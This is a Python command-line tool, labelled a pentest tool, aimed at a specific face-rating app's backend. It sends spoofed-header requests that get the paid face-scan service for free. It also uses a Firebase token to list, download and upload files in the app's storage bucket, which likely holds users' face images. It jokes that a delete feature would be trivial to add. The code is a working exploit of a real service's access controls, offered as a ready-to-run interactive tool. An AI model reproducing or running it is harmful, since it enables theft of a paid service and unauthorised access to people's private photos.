#!/usr/bin/env python3

import requests
import json
import time
import sys
import os
import urllib.parse
from urllib.parse import urlparse

try:
    from dotenv import load_dotenv
    # Try multiple locations for .env file (works for both script and exe)
    env_loaded = False
    
    # Try current directory first
    if os.path.exists('.env'):
        load_dotenv('.env')
        env_loaded = True
    # Try script directory
    elif os.path.exists(os.path.join(os.path.dirname(__file__), '.env')):
        load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))
        env_loaded = True
    # Try user home directory
    elif os.path.exists(os.path.join(os.path.expanduser('~'), '.env')):
        load_dotenv(os.path.join(os.path.expanduser('~'), '.env'))
        env_loaded = True
    # Try executable directory
    elif os.path.exists(os.path.join(os.path.dirname(sys.executable), '.env')):
        load_dotenv(os.path.join(os.path.dirname(sys.executable), '.env'))
        env_loaded = True
    
    if not env_loaded:
        print("Warning: .env file not found. Trying to continue...")
except ImportError:
    print("Warning: python-dotenv not installed. Trying to continue...")

class AiscendPentest:
    def __init__(self):
        self.face_api_url = os.getenv('FACE_API_URL')
        self.firebase_token = os.getenv('FIREBASE_TOKEN')
        self.firebase_bucket = os.getenv('FIREBASE_BUCKET')
        self.headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": os.getenv('ORIGIN_URL'),
            "Referer": os.getenv('REFERER_URL'),
            "User-Agent": os.getenv('USER_AGENT')
        }
        
        if not all([self.face_api_url, self.firebase_token, self.firebase_bucket]):
            print("Error: Missing environment variables. Please check your .env file.")
            print("Required variables: FACE_API_URL, FIREBASE_TOKEN, FIREBASE_BUCKET")
            print("\n.env file should be in one of these locations:")
            print(f"  - Current directory: {os.getcwd()}")
            print(f"  - Script directory: {os.path.dirname(__file__)}")
            print(f"  - User home: {os.path.expanduser('~')}")
            print(f"  - Executable directory: {os.path.dirname(sys.executable)}")
            print("\nMake sure your .env file contains all required variables.")
            sys.exit(1)
        
        # Debug: Show what was loaded (without exposing full tokens)
        print(f"Loaded from .env:")
        print(f"  Face API: {self.face_api_url}")
        print(f"  Firebase Bucket: {self.firebase_bucket}")
        print(f"  Firebase Token: {self.firebase_token[:30]}...")
        print(f"  Origin: {self.headers['Origin']}")
        print(f"  Referer: {self.headers['Referer']}")
        print(f"  User-Agent: {self.headers['User-Agent'][:50]}...")
        print()
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        
    def show_banner(self):
        self.clear_screen()
        print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                    AISCEND PENTEST TOOL                      ║
    ║                                                              ║
    ║  [1] Test Face Scan API Vulnerability                        ║
    ║  [2] Test Firebase Storage Vulnerability                     ║
    ║  [3] Exit                                                    ║
    ║                            v4d6                              ║
    ╚══════════════════════════════════════════════════════════════╝
        """)
        
    def check_direct_image(self, url):
        try:
            response = requests.head(url, timeout=10)
            content_type = response.headers.get('content-type', '')
            return 'image' in content_type or any(ext in url.lower() for ext in ['.jpg', '.jpeg', '.png', '.webp', '.gif'])
        except:
            return False
    
    def test_face_scan(self):
        self.clear_screen()
        print("Testing Face Scan API Vulnerability")
        print("=" * 50)
        
        front_url = input("Enter front image URL: ").strip()
        side_url = input("Enter side image URL: ").strip()
        
        if not self.check_direct_image(front_url):
            print("Front image URL doesn't appear to be a direct image link")
            input("Press Enter to continue...")
            return
            
        if not self.check_direct_image(side_url):
            print("Side image URL doesn't appear to be a direct image link")
            input("Press Enter to continue...")
            return
        
        payload = {
            "FrontimageUrl": front_url,
            "SideimageUrl": side_url,
            "email": "typeshit"
        }
        
        print(f"\nSending request to: {self.face_api_url}")
        print(f"Payload: {json.dumps(payload, indent=2)}")
        print("\nWaiting for response (this may take up to 2 minutes) not the code its just slow, if its not loading or there is an error then he most likely shut it off temporarily...")
        
        try:
            
            response = requests.post(
                self.face_api_url,
                json=payload,
                headers=self.headers,
                timeout=300
            )
            
            if response.status_code == 200:
                result = response.json()
                print("\nSUCCESS! API Response:")
                print("=" * 50)
                self.format_face_response(result)
            else:
                print(f"\nRequest failed with status {response.status_code}")
                print(f"Response: {response.text}")
                
        except requests.exceptions.Timeout:
            print("\nRequest timed out after 2 minutes")
        except Exception as e:
            print(f"\nError: {str(e)}")
        
        input("\nPress Enter to continue...")
    
    def format_face_response(self, data):
        if 'data' not in data:
            print(json.dumps(data, indent=2))
            return
            
        scores = data['data'].get('Scores', {})
        front = data['data'].get('front_profile', {})
        side = data['data'].get('side_profile', {})
        
        print(f"\nOVERALL SCORES:")
        print(f"  Overall: {scores.get('overall', 'N/A')}")
        print(f"  Potential: {scores.get('potential', 'N/A')}")
        print(f"  Face: {scores.get('Face', 'N/A')}")
        print(f"  Eyes: {scores.get('eyes', 'N/A')}")
        print(f"  Lips: {scores.get('lips', 'N/A')}")
        print(f"  Jaw: {scores.get('jaw', 'N/A')}")
        
        print(f"\nFRONT PROFILE:")
        if 'face' in front:
            face = front['face']
            print(f"  Face Shape: {face.get('face_shape', 'N/A')}")
            print(f"  FWHR: {face.get('FWHR', 'N/A')}")
            print(f"  Cheekbones: {face.get('cheekbones', 'N/A')}")
            print(f"  Facial Symmetry: {face.get('facial_symmetry', 'N/A')}")
            print(f"  Nose Width: {face.get('nose_width', 'N/A')}")
            print(f"  Eye Spacing: {face.get('eye_spacing', 'N/A')}")
        
        if 'eyes' in front:
            eyes = front['eyes']
            print(f"  Eye Type: {eyes.get('type', 'N/A')}")
            print(f"  Eye Color: {eyes.get('colour', 'N/A')}")
            print(f"  Eyebrow Type: {eyes.get('eyebrow_type', 'N/A')}")
        
        if 'lips' in front:
            lips = front['lips']
            print(f"  Lip Size: {lips.get('size', 'N/A')}")
            print(f"  Lip Color: {lips.get('colour', 'N/A')}")
            print(f"  Lip Type: {lips.get('type', 'N/A')}")
        
        print(f"\nSIDE PROFILE:")
        if 'face' in side:
            side_face = side['face']
            print(f"  Mandible: {side_face.get('mandible', 'N/A')}")
            print(f"  Maxilla: {side_face.get('maxilla', 'N/A')}")
            print(f"  Chin Projection: {side_face.get('chin_projection', 'N/A')}")
            print(f"  Jaw Visibility: {side_face.get('jaw_visibility', 'N/A')}")
        
        if 'nose' in side:
            nose = side['nose']
            print(f"  Nose Shape: {nose.get('nose_shape', 'N/A')}")
            print(f"  Brow Ridge: {nose.get('brow_ridge_prominence', 'N/A')}")
        
        print(f"\nSKIN ANALYSIS:")
        print(f"  Acne Level: {data['data'].get('Acne_level', 'N/A')}")
        skin_features = data['data'].get('Skin_features', [])
        if skin_features:
            for feature in skin_features:
                print(f"  • {feature}")
        
        print(f"\nVULNERABILITY CONFIRMED: API allows free access to paid service!")
    
    def test_firebase(self):
        self.clear_screen()
        print("Testing Firebase Storage Vulnerability")
        print("=" * 50)
        
        print(f"Using Firebase bucket: {self.firebase_bucket}")
        print(f"Using token: {self.firebase_token[:50]}...")
        
        while True:
            print("\nAvailable operations:")
            print("1. List files in bucket")
            print("2. Download a file")
            print("3. Upload a file")
            print("4. Delete a file")
            print("5. Back to main menu")
            
            choice = input("\nSelect operation (1-5): ").strip()
            
            if choice == "1":
                self.list_firebase_files()
            elif choice == "2":
                self.download_firebase_file()
            elif choice == "3":
                self.upload_firebase_file()
            elif choice == "4":
                self.delete_firebase_file()
            elif choice == "5":
                break
            else:
                print("Invalid choice")
            
            input("Press Enter to continue...")
            self.clear_screen()
            print("Testing Firebase Storage Vulnerability")
            print("=" * 50)
            print(f"Using Firebase bucket: {self.firebase_bucket}")
            print(f"Using token: {self.firebase_token[:50]}...")
    
    def list_firebase_files(self):
        print("\nListing files in bucket...")
        try:
            url = f"https://firebasestorage.googleapis.com/v0/b/{self.firebase_bucket}/o"
            headers = {"Authorization": f"Firebase {self.firebase_token}"}
            response = requests.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                if 'items' in data:
                    files = [item['name'] for item in data['items']]
                    print(f"\nFound {len(files)} files:")
                    for i, file in enumerate(files[:20], 1):
                        print(f"  {i}. {file}")
                    if len(files) > 20:
                        print(f"  ... and {len(files) - 20} more files")
                else:
                    print("No files found or unexpected response format")
                    print(f"Response keys: {list(data.keys())}")
            else:
                print(f"Failed to list files: {response.status_code}")
                print(f"Response: {response.text}")
                
        except Exception as e:
            print(f"Error listing files: {str(e)}")
            print(f"Full error: {e}")
    
    def download_firebase_file(self):
        filename = input("Enter filename to download: ").strip()
        try:
            encoded_filename = urllib.parse.quote(filename, safe='')
            url = f"https://firebasestorage.googleapis.com/v0/b/{self.firebase_bucket}/o/{encoded_filename}"
            headers = {"Authorization": f"Firebase {self.firebase_token}"}
            response = requests.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                print(f"File info: {json.dumps(data, indent=2)}")
                
                download_url = data.get('mediaLink')
                if not download_url:
                    download_url = data.get('downloadTokens')
                    if download_url:
                        download_url = f"https://firebasestorage.googleapis.com/v0/b/{self.firebase_bucket}/o/{encoded_filename}?alt=media&token={download_url}"
                
                if download_url:
                    print(f"Downloading from: {download_url}")
                    file_response = requests.get(download_url, headers=headers, timeout=60)
                    if file_response.status_code == 200:
                        local_path = f"downloaded_{filename.split('/')[-1]}"
                        with open(local_path, 'wb') as f:
                            f.write(file_response.content)
                        print(f"File downloaded to: {local_path}")
                    else:
                        print(f"Download failed: {file_response.status_code}")
                        print(f"Download response: {file_response.text}")
                else:
                    print("No download URL found")
                    print("Available keys in response:", list(data.keys()))
            else:
                print(f"File not found: {response.status_code}")
                print(f"Response: {response.text}")
                
        except Exception as e:
            print(f"Download error: {str(e)}")
            print(f"Full error: {e}")
    
    def upload_firebase_file(self):
        local_file = input("Enter local file path: ").strip()
        if not os.path.exists(local_file):
            print("Local file not found")
            return
            
        remote_path = input("Enter remote path (e.g., uploads/test.jpg): ").strip()
        try:
            url = f"https://firebasestorage.googleapis.com/v0/b/{self.firebase_bucket}/o"
            headers = {"Authorization": f"Firebase {self.firebase_token}"}
            
            with open(local_file, 'rb') as f:
                file_content = f.read()
                
            params = {
                'name': remote_path,
                'uploadType': 'media'
            }
            
            response = requests.post(
                url,
                headers={**headers, 'Content-Type': 'application/octet-stream'},
                params=params,
                data=file_content,
                timeout=60
            )
            
            if response.status_code == 200:
                print(f"File uploaded to: {remote_path}")
                print(f"Response: {response.json()}")
            else:
                print(f"Upload failed: {response.status_code}")
                print(f"Response: {response.text}")
                
        except Exception as e:
            print(f"Upload error: {str(e)}")
            print(f"Full error: {e}")
    
    def delete_firebase_file(self):
        print("Yes this is literally possible but I'm testing not destroying so ye (its like 4 lines of code if I wanted to)")
        input("Press Enter to continue...")
    
    def run(self):
        while True:
            self.show_banner()
            choice = input("Select option (1-3): ").strip()
            
            if choice == "1":
                self.test_face_scan()
            elif choice == "2":
                self.test_firebase()
            elif choice == "3":
                print("\nExiting...")
                break
            else:
                print("Invalid choice. Please select 1-3.")
                input("Press Enter to continue...")

if __name__ == "__main__":
    print("Checking dependencies...")
    
    try:
        import requests
    except ImportError:
        print("Installing requests...")
        os.system("pip install requests")
        import requests
    
    print("All dependencies installed successfully!")
    pentest = AiscendPentest()
    pentest.run()
